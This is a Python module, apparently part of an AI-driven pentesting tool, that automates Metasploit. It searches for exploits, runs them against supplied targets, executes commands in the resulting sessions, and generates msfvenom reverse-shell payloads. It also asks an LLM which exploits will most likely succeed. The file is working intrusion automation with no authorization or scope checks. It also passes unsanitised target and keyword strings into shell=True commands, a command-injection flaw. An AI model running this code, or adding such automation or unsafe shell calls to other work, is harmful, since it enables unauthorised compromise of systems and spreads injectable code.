"""
Metasploit Framework Integration
Automate exploitation with Metasploit
"""

import subprocess
import json
import time
from typing import List, Dict, Any, Optional
from dataclasses import dataclass

from core.config import get_config
from core.llm_interface import get_llm


@dataclass
class ExploitResult:
    """Metasploit exploit result"""
    exploit_name: str
    target: str
    success: bool
    session_id: Optional[int] = None
    output: str = ""
    error: str = ""


class MetasploitIntegration:
    """Metasploit Framework integration"""

    def __init__(self):
        self.config = get_config()
        self.llm = get_llm()
        self.msf_path = self.config.get("exploitation.metasploit.path", "msfconsole")
        self.sessions: Dict[int, Dict] = {}

    def search_exploit(self, keyword: str) -> List[Dict[str, str]]:
        """
        Search for exploits in Metasploit

        Args:
            keyword: Search keyword (e.g., "apache", "smb")

        Returns:
            List of matching exploits
        """
        print(f"[*] Searching Metasploit for: {keyword}")

        try:
            # Use msfconsole to search
            cmd = f"msfconsole -q -x 'search {keyword}; exit'"
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
            )

            exploits = self._parse_search_results(result.stdout)

            print(f"[+] Found {len(exploits)} exploits")

            # AI analysis of exploits
            if exploits:
                self._ai_analyze_exploits(exploits, keyword)

            return exploits

        except Exception as e:
            print(f"[!] Search failed: {e}")
            return []

    def _parse_search_results(self, output: str) -> List[Dict[str, str]]:
        """Parse msfconsole search output"""
        exploits = []

        for line in output.split('\n'):
            if 'exploit/' in line or 'auxiliary/' in line:
                parts = line.split()
                if len(parts) >= 2:
                    exploits.append({
                        "name": parts[0],
                        "description": ' '.join(parts[1:]),
                    })

        return exploits

    def _ai_analyze_exploits(self, exploits: List[Dict[str, str]], keyword: str):
        """AI analysis of available exploits"""
        print("\n[*] Analyzing exploits with AI...")

        exploit_list = "\n".join([
            f"- {e['name']}: {e['description']}"
            for e in exploits[:10]  # Top 10
        ])

        prompt = f"""Analyze the following Metasploit exploits for '{keyword}':

{exploit_list}

Provide:
1. **Most Effective**: Which exploits are most likely to succeed?
2. **Difficulty**: Ranking by difficulty (easy/medium/hard)
3. **Prerequisites**: What conditions are needed?
4. **Recommendations**: Which to try first and why?

Be concise and actionable."""

        try:
            analysis = self.llm.generate(prompt)
            print("\n" + "=" * 80)
            print("AI EXPLOIT ANALYSIS:")
            print("=" * 80)
            print(analysis)
            print("=" * 80 + "\n")
        except Exception as e:
            print(f"[!] AI analysis failed: {e}")

    def run_exploit(
        self,
        exploit_name: str,
        target: str,
        options: Dict[str, str] = None,
    ) -> ExploitResult:
        """
        Run a Metasploit exploit

        Args:
            exploit_name: Exploit module name
            target: Target IP/hostname
            options: Additional options (LHOST, LPORT, etc.)

        Returns:
            ExploitResult
        """
        print(f"[*] Running exploit: {exploit_name}")
        print(f"[*] Target: {target}")

        if options is None:
            options = {}

        # Build msfconsole commands
        commands = [
            f"use {exploit_name}",
            f"set RHOSTS {target}",
        ]

        # Add custom options
        for key, value in options.items():
            commands.append(f"set {key} {value}")

        commands.extend([
            "check",
            "exploit -z",
            "sessions -l",
            "exit",
        ])

        resource_script = '\n'.join(commands)

        try:
            # Write resource script
            with open('/tmp/msf_resource.rc', 'w') as f:
                f.write(resource_script)

            # Run exploit
            cmd = f"{self.msf_path} -q -r /tmp/msf_resource.rc"
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=120,
            )

            # Parse result
            success = "session" in result.stdout.lower()
            session_id = self._extract_session_id(result.stdout) if success else None

            exploit_result = ExploitResult(
                exploit_name=exploit_name,
                target=target,
                success=success,
                session_id=session_id,
                output=result.stdout,
            )

            if success:
                print(f"[+] Exploit successful! Session: {session_id}")
                self.sessions[session_id] = {
                    "exploit": exploit_name,
                    "target": target,
                    "created": time.time(),
                }
            else:
                print(f"[!] Exploit failed")

            return exploit_result

        except subprocess.TimeoutExpired:
            print("[!] Exploit timeout")
            return ExploitResult(
                exploit_name=exploit_name,
                target=target,
                success=False,
                error="Timeout",
            )
        except Exception as e:
            print(f"[!] Exploit execution failed: {e}")
            return ExploitResult(
                exploit_name=exploit_name,
                target=target,
                success=False,
                error=str(e),
            )

    def _extract_session_id(self, output: str) -> Optional[int]:
        """Extract session ID from output"""
        import re
        match = re.search(r'session (\d+)', output.lower())
        return int(match.group(1)) if match else None

    def list_sessions(self) -> List[Dict[str, Any]]:
        """List active Metasploit sessions"""
        print("[*] Listing active sessions...")

        try:
            cmd = f"{self.msf_path} -q -x 'sessions -l; exit'"
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
            )

            print(result.stdout)
            return list(self.sessions.values())

        except Exception as e:
            print(f"[!] Failed to list sessions: {e}")
            return []

    def interact_session(self, session_id: int, command: str) -> str:
        """
        Execute command in Metasploit session

        Args:
            session_id: Session ID
            command: Command to execute

        Returns:
            Command output
        """
        print(f"[*] Executing in session {session_id}: {command}")

        try:
            commands = [
                f"sessions -i {session_id}",
                command,
                "background",
                "exit",
            ]

            resource_script = '\n'.join(commands)

            with open('/tmp/msf_interact.rc', 'w') as f:
                f.write(resource_script)

            cmd = f"{self.msf_path} -q -r /tmp/msf_interact.rc"
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,
            )

            return result.stdout

        except Exception as e:
            print(f"[!] Session interaction failed: {e}")
            return ""

    def generate_payload(
        self,
        payload_type: str,
        lhost: str,
        lport: int = 4444,
        format: str = "elf",
    ) -> Optional[str]:
        """
        Generate Metasploit payload

        Args:
            payload_type: Payload type (e.g., "linux/x64/meterpreter/reverse_tcp")
            lhost: Listener host
            lport: Listener port
            format: Output format

        Returns:
            Path to generated payload
        """
        print(f"[*] Generating payload: {payload_type}")

        output_file = f"/tmp/payload.{format}"

        try:
            cmd = [
                "msfvenom",
                "-p", payload_type,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", format,
                "-o", output_file,
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60,
            )

            if result.returncode == 0:
                print(f"[+] Payload saved to {output_file}")
                return output_file
            else:
                print(f"[!] Payload generation failed: {result.stderr}")
                return None

        except Exception as e:
            print(f"[!] Payload generation failed: {e}")
            return None

    def suggest_exploit_for_service(self, service: str, version: str) -> List[str]:
        """
        AI-powered exploit suggestions

        Args:
            service: Service name
            version: Service version

        Returns:
            List of suggested exploits
        """
        print(f"[*] Finding exploits for {service} {version}...")

        # Search in Metasploit
        exploits = self.search_exploit(f"{service} {version}")

        # Get AI recommendations
        prompt = f"""Based on Metasploit database, recommend the best exploits for:

Service: {service}
Version: {version}

Available exploits:
{json.dumps([e['name'] for e in exploits[:5]], indent=2)}

Provide:
1. Top 3 exploits to try
2. Success probability for each
3. Required conditions
4. Exploitation steps

Be specific and actionable."""

        try:
            analysis = self.llm.generate(prompt)
            print("\n" + "=" * 80)
            print("AI RECOMMENDATIONS:")
            print("=" * 80)
            print(analysis)
            print("=" * 80 + "\n")
        except Exception as e:
            print(f"[!] AI recommendations failed: {e}")

        return [e['name'] for e in exploits]
